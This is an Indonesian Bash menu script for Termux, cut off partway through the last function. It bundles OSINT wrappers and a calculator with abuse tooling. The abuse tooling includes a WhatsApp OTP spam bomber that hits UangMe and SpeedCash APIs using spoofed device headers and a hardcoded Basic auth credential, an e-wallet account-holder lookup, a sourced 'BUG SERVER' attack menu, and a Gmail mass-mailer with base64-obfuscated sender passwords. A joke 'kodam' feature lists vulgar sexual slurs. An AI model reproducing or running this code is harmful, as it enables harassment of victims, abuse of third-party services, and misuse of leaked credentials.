  read -p "Tekan ENTER untuk melanjutkan..."
}

holehe_feature() {
  # Warna Neon
  red_neon="\e[1;5;91m"
  yellow_neon="\e[1;5;93m"
  green_neon="\e[1;92m"
  cyan_neon="\e[1;96m"
  reset="\e[0m"

  clear
  echo -e "${cyan_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${cyan_neon}┃           ${yellow_neon}EMAIL OSINT - HOLEHE${cyan_neon}            ┃${reset}"
  echo -e "${cyan_neon}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫${reset}"
  echo -e "${cyan_neon}┃   Developer : ${green_neon}MRS Official ✓${cyan_neon}              ┃${reset}"
  echo -e "${cyan_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo

  echo -e "${yellow_neon}[+] Mengecek dependensi...${reset}"
  pkg install -y git python python3 > /dev/null 2>&1

  if [ ! -d "$HOME/holehe" ]; then
      echo -e "${green_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
      echo -e "${green_neon}┃ [✔] Meng-clone Holehe...                     ┃${reset}"
      echo -e "${green_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
      git clone https://github.com/megadose/holehe.git "$HOME/holehe"
      cd "$HOME/holehe" || exit
      python3 setup.py install
  fi

  cd "$HOME/holehe" || exit

  clear
  echo -e "${cyan_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${cyan_neon}┃        📩 Masukkan Email Target              ┃${reset}"
  echo -e "${cyan_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo
  read -p "[Email] > " email

  echo -e "${yellow_neon}[+] Memproses email: ${green_neon}$email${reset}"
  sleep 1
  echo
  holehe "$email"

  echo
  echo -e "${cyan_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${cyan_neon}┃   Tekan [ENTER] untuk kembali ke menu        ┃${reset}"
  echo -e "${cyan_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  read
}

menu_osint() {
  # Warna Neon
  red_neon="\e[1;5;91m"
  yellow_neon="\e[1;5;93m"
  green_neon="\e[1;92m"
  cyan_neon="\e[1;96m"
  reset="\e[0m"

  clear
  echo -e "${cyan_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${cyan_neon}┃        🔍 ${yellow_neon}Menu OSINT - Mr.Holmes${cyan_neon}         ┃${reset}"
  echo -e "${cyan_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo

  # Cek apakah Mr.Holmes sudah terinstall
  if [ ! -d "$HOME/Mr.Holmes" ]; then
      echo -e "${yellow_neon}📦 Menginstall Mr.Holmes... Tunggu sebentar...${reset}"
      pkg install -y proot git python python3
      cd "$HOME" || exit
      git clone https://github.com/Lucksi/Mr.Holmes
      cd Mr.Holmes || exit
      proot -0 chmod +x install_Termux.sh
      ./install_Termux.sh
  else
      echo -e "${green_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
      echo -e "${green_neon}┃ [✔] Mr.Holmes sudah terinstall!              ┃${reset}"
      echo -e "${green_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
      cd "$HOME/Mr.Holmes" || exit
  fi

  echo
  echo -e "${cyan_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${cyan_neon}┃ 🚀 Menjalankan Mr.Holmes...                 ┃${reset}"
  echo -e "${cyan_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo
  python3 MrHolmes.py

  echo
  echo -e "${cyan_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${cyan_neon}┃   Tekan [ENTER] untuk kembali ke menu        ┃${reset}"
  echo -e "${cyan_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  read
}

ipgeo_feature() {
  # Warna Neon
  red_neon="\e[1;5;91m"
  yellow_neon="\e[1;5;93m"
  green_neon="\e[1;92m"
  cyan_neon="\e[1;96m"
  reset="\e[0m"

  clear
  echo -e "${cyan_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${cyan_neon}┃      🌍 ${yellow_neon}IP GEOLOCATION LOOKUP${cyan_neon}             ┃${reset}"
  echo -e "${cyan_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo -e "${cyan_neon}┃   Developer : ${green_neon}MRS Official ✓${cyan_neon}               ┃${reset}"
  echo -e "${cyan_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo

  echo -e "${yellow_neon}[+] Mengecek dependensi...${reset}"
  pkg install -y git python python2 > /dev/null 2>&1

  if [ ! -d "$HOME/IPGeoLocation" ]; then
      echo -e "${green_neon}[✓] Meng-clone IPGeoLocation...${reset}"
      git clone https://github.com/maldevel/IPGeoLocation.git $HOME/IPGeoLocation
      cd $HOME/IPGeoLocation || exit
      chmod +x ipgeolocation.py
      pip install -r requirements.txt
  fi

  cd $HOME/IPGeoLocation || exit

  clear
  echo -e "${cyan_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${cyan_neon}┃   🌐 Masukkan target IP / Website           ┃${reset}"
  echo -e "${cyan_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo
  read -p "[Target] > " target

  echo -e "${yellow_neon}[+] Memproses target: ${green_neon}$target${reset}"
  sleep 1
  echo
  python ipgeolocation.py -t "$target"

  echo
  echo -e "${cyan_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${cyan_neon}┃   Tekan [ENTER] untuk kembali ke menu        ┃${reset}"
  echo -e "${cyan_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  read
}

all_kalkulator() {
  # Warna Neon
  red_neon="\e[1;5;91m"
  yellow_neon="\e[1;5;93m"
  green_neon="\e[1;92m"
  cyan_neon="\e[1;96m"
  blue_neon="\e[1;94m"
  purple_neon="\e[1;95m"
  reset="\e[0m"

  clear
  echo -e "${cyan_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${cyan_neon}┃        ${yellow_neon}ＡＬＬ  ＫＡＬＫＵＬＡＴＯＲ${cyan_neon}             ┃${reset}"
  echo -e "${cyan_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo

  echo -e "${blue_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "┃ ${red_neon}1)${reset} Penjumlahan"
  echo -e "┃ ${yellow_neon}2)${reset} Pengurangan"
  echo -e "┃ ${green_neon}3)${reset} Perkalian"
  echo -e "┃ ${purple_neon}4)${reset} Pembagian"
  echo -e "${blue_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo

  read -p "Pilih operasi (1-4) : " op_choice
  read -p "Masukkan angka pertama : " a
  read -p "Masukkan angka kedua   : " b
  echo

  # Validasi input angka
  if ! [[ "$a" =~ ^-?[0-9]+(\.[0-9]+)?$ && "$b" =~ ^-?[0-9]+(\.[0-9]+)?$ ]]; then
    echo -e "${red_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
    echo -e "┃ ⚠️ Input harus angka!${reset}"
    echo -e "${red_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
    return 1
  fi

  case $op_choice in
    1)
      result=$(echo "$a + $b" | bc)
      op_sign="+"
      ;;
    2)
      result=$(echo "$a - $b" | bc)
      op_sign="-"
      ;;
    3)
      result=$(echo "$a * $b" | bc)
      op_sign="×"
      ;;
    4)
      if [[ $b == 0 ]]; then
        echo -e "${red_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
        echo -e "┃ ❌ Error: Tidak bisa ÷ 0!${reset}"
        echo -e "${red_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
        return 1
      fi
      result=$(echo "scale=2; $a / $b" | bc)
      op_sign="÷"
      ;;
    *)
      echo -e "${red_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
      echo -e "┃ ⚠️ Pilihan operasi tidak valid!${reset}"
      echo -e "${red_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
      return 1
      ;;
  esac

  echo -e "${green_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  printf "┃ 🔮 Hasil: ${yellow_neon}%s %s %s ${blue_neon}= ${purple_neon}%s${reset}\n" "$a" "$op_sign" "$b" "$result"
  echo -e "${green_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo

  read -p "Tekan ENTER untuk kembali..." temp
}

# =========================
# Fitur Cek Kodam (Kotak Neon)
# =========================

cek_kodam() {
  # Warna neon
  cyan_neon="\e[1;96m"
  yellow_neon="\e[1;93m"
  green_neon="\e[1;92m"
  reset="\e[0m"

  clear
  echo -e "${cyan_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${cyan_neon}┃         ${green_neon}🔮 CEK KODAM ONLINE${cyan_neon}         ┃${reset}"
  echo -e "${cyan_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo

  read -p "Masukkan Nama Kamu : " nama
  read -p "Masukkan Tanggal Lahir (dd-mm-yyyy): " tgl

  # Daftar kodam (bisa kamu tambah sendiri)
  kodam_list=(
    "BABI HUTAN"
    "AYAM BERAK"
    "SUGIONO"
    "TIKUS BERDASI"
    "ANJENG PUNTONG"
    "PENGENTOD HANDAL"
    "BUAYA KEPALA BATU"
    "ANAK KONTOL"
    "ANJAY JADI BABI"
    "MIA KHALIFA"
  )

  # Hash sederhana dari nama+tgl → pilih kodam
  key="${nama}${tgl}"
  hash=$(echo -n "$key" | md5sum | tr -d " -")
  index=$((0x${hash:0:4} % ${#kodam_list[@]}))
  hasil=${kodam_list[$index]}

  echo
  echo -e "${yellow_neon}Nama        :${reset} $nama"
  echo -e "${yellow_neon}Tanggal Lhr :${reset} $tgl"
  echo -e "${yellow_neon}Kodam Anda  :${green_neon}$hasil${reset}"
  echo
  echo -e "${cyan_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${cyan_neon}┃   Tekan [ENTER] untuk kembali menu  ┃${reset}"
  echo -e "${cyan_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  read
}

# =========================
# Fitur Spam WhatsApp SUMUT
# =========================

# Function to apply ANSI color codes to text
color() {
  local color_code=$1
  local text=$2
  local reset_code="\033[0m"

  case "$color_code" in
    red) printf "\033[31m%s${reset_code}\n" "$text" ;;
    green) printf "\033[32m%s${reset_code}\n" "$text" ;;
    yellow) printf "\033[33m%s${reset_code}\n" "$text" ;;
    blue) printf "\033[34m%s${reset_code}\n" "$text" ;;
    magenta) printf "\033[35m%s${reset_code}\n" "$text" ;;
    cyan) printf "\033[36m%s${reset_code}\n" "$text" ;;
    white) printf "\033[37m%s${reset_code}\n" "$text" ;;
    *) printf "%s${reset_code}\n" "$text" ;;
  esac
}

BLUE='\033[1;94m'; GREEN='\033[1;92m'; RED='\033[1;91m'
CYAN='\033[1;96m'; YELLOW='\033[1;93m'; MAGENTA='\033[1;95m'; WHITE='\033[1;97m'; NC='\033[0m'

codex() {
  local length=$1
  tr -dc A-Za-z0-9 </dev/urandom | head -c "$length"
}

fetch_value() {
  local response=$1
  local start_string=$2
  local end_string=$3

  local start_index=$(expr index "$response" "$start_string")
  if [ "$start_index" -eq 0 ]; then return; fi
  start_index=$((start_index + ${#start_string}))
  local remaining_string="${response:$start_index}"
  local end_index=$(expr index "$remaining_string" "$end_string")
  if [ "$end_index" -eq 0 ]; then return; fi
  end_index=$((end_index - 1))
  printf "%s\n" "${remaining_string:0:$end_index}"
}

uangme() {
  local nomor=$1
  local aid="gaid_15497a9b-2669-42cf-ad10-$(codex 12)"
  local url="https://api.uangme.com/api/v2/sms_code?phone=$nomor&scene_type=login&send_type=wp"
  local headers=( "aid: $aid" "android_id: b787045b140c631f" "app_version: 300504" "brand: samsung" \
    "carrier: 00" "Content-Type: application/x-www-form-urlencoded" "country: 510" \
    "dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0" "fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo" \
    "gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0" "lan: in_ID" "model: SM-G965N" "ns: wifi" \
    "os: 1" "timestamp: 1732178536" "tz: Asia%2FBangkok" "User-Agent: okhttp/3.12.1" "v: 1" "version: 28" )

  local response=$(curl -s -H "${headers[0]}" -H "${headers[1]}" -H "${headers[2]}" -H "${headers[3]}" \
    -H "${headers[4]}" -H "${headers[5]}" -H "${headers[6]}" -H "${headers[7]}" -H "${headers[8]}" \
    -H "${headers[9]}" -H "${headers[10]}" -H "${headers[11]}" -H "${headers[12]}" -H "${headers[13]}" \
    -H "${headers[14]}" -H "${headers[15]}" -H "${headers[16]}" "$url")
  local result=$(fetch_value "$response" '{"code":"' '","')

  if [ "$result" == "200" ]; then
    color red "Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "UANGME: $response"
    return 1
  fi
}

speedcash() {
  local nomor=$1
  local url_token="https://sofia.bmsecure.id/central-api/oauth/token"
  local payload_token="grant_type=client_credentials"
  local headers_token=("Authorization: Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==" "Content-Type: application/x-www-form-urlencoded")

  local response_token=$(curl -s -X POST -d "$payload_token" -H "${headers_token[0]}" -H "${headers_token[1]}" "$url_token")
  local auth=$(fetch_value "$response_token" 'access_token":"' '","')

  local url_otp="https://sofia.bmsecure.id/central-api/sc-api/otp/generate"
  local uuid=$(codex 8)
  local payload_otp="{\"version_name\": \"6.2.1 (428)\", \"phone\": \"$nomor\", \"appid\": \"SPEEDCASH\", \"version_code\": 428, \"location\": \"0,0\", \"state\": \"REGISTER\", \"type\": \"WA\", \"app_id\": \"SPEEDCASH\", \"uuid\": \"00000000-4c22-250d-ffff-ffff${uuid}\", \"via\": \"BB ANDROID\"}"
  local headers_otp=("Authorization: Bearer $auth" "Content-Type: application/json")

  local response_otp=$(curl -s -X POST -d "$payload_otp" -H "${headers_otp[0]}" -H "${headers_otp[1]}" "$url_otp")
  local result=$(fetch_value "$response_otp" '"rc":"' '","')

  if [ "$result" == "00" ]; then
    color red "Spam Whatsapp Ke $nomor"
    return 0
  else
    color yellow "SPEEDCASH: $response_otp"
    return 1
  fi
}

sms_whatsapp() {
  local nomor=$1
  color green "Starting spam to $nomor..."
  speedcash "$nomor"
  uangme "$nomor"
  color green "Done Spam To $nomor"
}

send_otp_with_delay() {
  local nomor=$1
  local delay=$2
  sms_whatsapp "$nomor"
  sleep "$delay"
}

# Banner Fiktur
kasi_warna_green() {
  tput setaf 2
  echo "$1"
  tput sgr0
}

sumut_banner() {
  echo ' '
  echo '               HELLO MY NAME IS SUMUT! ';
  kasi_warna_green '                  .xH888888Hx. ';
  kasi_warna_green '                 .H8888888888888: ';          
  kasi_warna_green '                 888*"\"\"?\""*888';
  kasi_warna_green "                       d8x.   ^%88k ";
  kasi_warna_green "                      <88888X   '?8 ";
  kasi_warna_green '                 `:..:`888888>    8> ';
  kasi_warna_green '                        `"*88     X ';
  kasi_warna_green '                   .xHHhx.."      ! ';
  kasi_warna_green '                  X88888888hx. ..! ';
  kasi_warna_green '                     "*888888888" ';
  kasi_warna_green '                        ^"***"` ';
  echo -e "${YELLOW}                  [ ${GREEN}S${RED}U${BLUE}M${YELLOW}U${RED}T${GREEN}E${RED}R${BLUE}R${YELLOW}O${RED}R${BLUE}S${GREEN}E${RED}S${YELLOW} ]${RED}"
  echo -e "${BLUE}                   WhatsApp:${RED}@6283191320700${NC}"
  echo -e "${RED}   ──────────────────────────────────────────────────${NC}"
  echo -e "${WHITE}   ──────────────────────────────────────────────────${NC}"
  echo -e "${RED}
      ╭────────────────────────────────────────╮
      │           ${BLUE}SUMUT S.E.S 80${RED}            │
      ╰────────────────────────────────────────╯
    ${NC}"
}

# Function utama fiktur
fitur_spam_sumut() {
  sumut_banner
  read -p "$(color green "       MASUKAN NOMOR Saya (62XX): ")" nomor
  if [[ ! "$nomor" =~ ^62[0-9]+$ ]]; then
    color yellow "Nomor harus dimulai dengan 62 dan hanya berisi angka."
  else
    send_otp_with_delay "$nomor" 2
  fi
  echo
  read -p "Tekan [Enter] untuk kembali ke menu..."
}

# =========================
# Fitur Attack Menu (Full Kotak Neon)
# =========================
# include file attack.sh biar fungsi bug_aku dikenali
source attack.sh

bug_aku() {
    clear
    echo "1) BUG SERVER"
    echo "0) Exit"
    read -p "Pilih : " pilih

    case $pilih in
        1) attack_menu ;;   # panggil dari file luar
        0) exit ;;
        *) echo "Pilihan salah";;
    esac
}

cake_name_pake_nomor() {
  RED='\033[1;91m'
  CYAN='\033[1;96m'
  YELLOW='\033[1;93m'
  GREEN='\033[1;92m'
  NC='\033[0m'

  clear

  # Banner ASCII
  echo -e "${CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
  echo -e "${CYAN}┃                  ${RED}⚡ ACCOUNT CHECKER ⚡${CYAN}                ┃${NC}"
  echo -e "${CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
  echo -e "${RED}"
  cat <<'EOF'
                       ⢀⣀⣤⣤⣀⡀                      
                    ⣠⣶⡿⠟⠛⠛⠻⢿⣷⣆⡀                   
                  ⢠⣾⡿⠋      ⠉⢻⣿⣄                  
                 ⢠⣿⡟          ⠹⣿⡆                 
                 ⣾⡿  ⣤⣖⣿⣿⣿⣿⣒⡦⡀ ⢻⣿⡄                
                ⢸⣿⣧⣴⣾⣿⡛⣿⣿⣿⣿⠛⣻⣷⣶⣄⣿⡇                
                ⢸⣿⣿⣿⣿⠿⠿⠛⠋⠙⠛⠿⠿⣿⣿⣿⣿⡇                
                ⠈⢿⣿⣿⣿⣆      ⣠⣿⣿⣿⣿⠃                
               ⣠⣴⣿⣿⣷⡿⣿⣷⣄⡀ ⣀⣴⣿⢟⣽⣿⣿⣷⣄               
             ⢀⣾⡿⠏⠙⠿⣿⣿⣌⠻⢿⣿⣿⡿⠟⣩⣾⣿⡿⠛⠙⢿⣷⡄             
            ⢀⣾⡿     ⠙⠛⠳⠄   ⠴⠛⠋⠁    ⢻⣿⡄            
            ⣸⣿⠁⢠⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣄ ⣿⣧            
           ⢰⣿⠏ ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿ ⠘⣿⣇           
           ⣿⣟  ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡇  ⢹⣿           
           ⢻⣿⣦⣀ ⣿⣿⣿⣿⣿⣿⣿⣿⡅⢀⣿⣿⣿⣿⣿⣿⣿⣿⡇⣀⣤⣾⡿           
            ⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁           
              ⠈⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁              
                ⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧                
                ⠈⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠉ 
                 [Hellow My Name is MRS]
Masukkan nomor HP (dengan kode negara, contoh 08xxx):
EOF
  echo -e "${NC}\n"

  # Input nomor rekening/e-wallet
  echo -e "${YELLOW}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
  echo -e "${YELLOW}┃ Masukkan nomor rekening / e-wallet                   ┃${NC}"
  echo -e "${YELLOW}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
  echo -ne "💳 Nomor : "
  read -r ACCOUNT_NUMBER
  echo

  BANKS=("ovo" "dana" "linkaja" "gopay" "shopeepay")

  for BANK in "${BANKS[@]}"; do
    RESPONSE=$(curl -s -X POST "https://cekrekening-api.belibayar.online/api/v1/account-inquiry" \
      -H "Content-Type: application/json" \
      -d "{\"account_bank\":\"$BANK\",\"account_number\":\"$ACCOUNT_NUMBER\"}")

    if echo "$RESPONSE" | jq empty 2>/dev/null; then
      MESSAGE=$(echo "$RESPONSE" | jq -r '.message')
      ACCOUNT_HOLDER=$(echo "$RESPONSE" | jq -r '.data.account_holder')

      echo -e "${GREEN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
      printf "${GREEN}┃${NC} 🔎 Checking %-10s | Nomor: %-20s ${GREEN}┃${NC}\n" "$BANK" "$ACCOUNT_NUMBER"
      printf "${GREEN}┃${NC} Status : %-37s ${GREEN}┃${NC}\n" "$MESSAGE"
      if [[ -n "$ACCOUNT_HOLDER" && "$ACCOUNT_HOLDER" != "null" ]]; then
        printf "${GREEN}┃${NC} Nama   : %-37s ${GREEN}┃${NC}\n" "$ACCOUNT_HOLDER"
      else
        printf "${GREEN}┃${NC} Nama   : %-37s ${GREEN}┃${NC}\n" "(tidak tersedia)"
      fi
      echo -e "${GREEN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}\n"

    else
      echo -e "${RED}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
      echo -e "${RED}┃ [Error] Response bukan JSON valid                    ┃${NC}"
      echo -e "${RED}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
      echo "$RESPONSE"
    fi
  done

  # Exit Prompt
  echo -e "${RED}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
  echo -e "${RED}┃   Tekan [ENTER] untuk kembali ke menu utama...       ┃${NC}"
  echo -e "${RED}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
  read
}

info() {
  RED='\033[1;91m'
  GREEN='\033[1;92m'
  BLUE='\033[1;94m'
  NC='\033[0m'

  clear
  echo -e "${RED}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
  echo -e "${RED}┃              ${BLUE}ℹ️  INFO TOOLS ${RED}              ┃${NC}"
  echo -e "${RED}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"

  echo -e "${GREEN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
  echo -e "${GREEN}┃ Tools ini dibuat oleh ${BLUE}MrsOfficial${GREEN}.            ┃${NC}"
  echo -e "${GREEN}┃                                              ┃${NC}"
  echo -e "${GREEN}┃ Jika ada kendala apapun itu boleh,           ┃${NC}"
  echo -e "${GREEN}┃ tanya ke saya ${BLUE}MrsOfficial${GREEN}.                  ┃${NC}"
  echo -e "${GREEN}┃______________________________________________┃${NC}"
  echo -e "${GREEN}┃ Saya harap Anda menggunakan tools ini        ┃${NC}"
  echo -e "${GREEN}┃ sebaik-baiknya.                              ┃${NC}"
  echo -e "${GREEN}┃                                              ┃${NC}"
  echo -e "${GREEN}┃ Ingat, hargai saya ${BLUE}Mrs${GREEN},                   ┃${NC}"
  echo -e "${GREEN}┃ jangan hapus credit sedikitpun!!             ┃${NC}"
  echo -e "${GREEN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"

  echo -e "${RED}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
  echo -e "${RED}┃             ${BLUE}🔥 MRS OFFICIAL 80 🔥${RED}             ┃${NC}"
  echo -e "${RED}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
  echo
  read -p "🔙 Tekan ENTER untuk kembali ke menu..."
}

kirim_gmail_vip() {
  CYAN='\033[1;36m'
  GREEN='\033[1;32m'
  YELLOW='\033[1;33m'
  RED='\033[1;31m'
  NC='\033[0m'

  clear
  echo -e "${CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
  echo -e "${CYAN}┃${YELLOW}              ✉️  GMAIL VIP  ${CYAN}              ┃${NC}"
  echo -e "${CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
  echo

  echo -e "${YELLOW}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
  read -p "┃ Masukkan Gmail tujuan : " target
  read -p "┃ Isi pesan             : " msg
  read -p "┃ Jumlah pesan (max 100): " count
  read -p "┃ Delay antar pesan (s) : " delay
  echo -e "${YELLOW}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
  echo

  if [[ -z "$target" || -z "$msg" || -z "$count" || -z "$delay" ]]; then
    echo -e "${RED}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
    echo -e "${RED}┃         ⚠️  Input tidak lengkap!          ┃${NC}"
    echo -e "${RED}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
    return 1
  fi

  if [[ "$count" -gt 100 ]]; then
    echo -e "${RED}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
    echo -e "${RED}┃      ❌ Maksimal hanya 100 pesan!         ┃${NC}"
    echo -e "${RED}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
    count=100
  fi

  python3 <<'END'
import smtplib, time, sys, base64

# Encode pakai base64 (disamarkan)
enc_senders = [
    "YmxhY2tjYXR0ZWFtMDAxQGdtYWlsLmNvbQ==",
    "dGVhbWJsYWNrY2F0NEBnbWFpbC5jb20="
]
enc_passwords = [
    "dW93diB5Ym1vIHF1ZmwgcXZ3dg==",
    "YnFubCBsdG16IGFic3ogc3BuZg=="
]

senders = [base64.b64decode(e).decode() for e in enc_senders]
passwords = [base64.b64decode(e).decode() for e in enc_passwords]

receiver = "$target"
message = "$msg"
count = int($count)
delay = int($delay)

print("\033[1;33m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
print("┃         🚀 PROSES PENGIRIMAN DIMULAI      ┃")
print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[0m")

for idx in range(len(senders)):
    sender = senders[idx]
    password = passwords[idx]
    for i in range(1, count+1):
        try:
            server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            server.login(sender, password)
            subject = f"Test Message {i}"
            body = f"Subject: {subject}\n\n{message}"
            server.sendmail(sender, receiver, body)
            server.quit()

            bar = f"┃ Pesan {i}/{count} terkirim ke {receiver}"
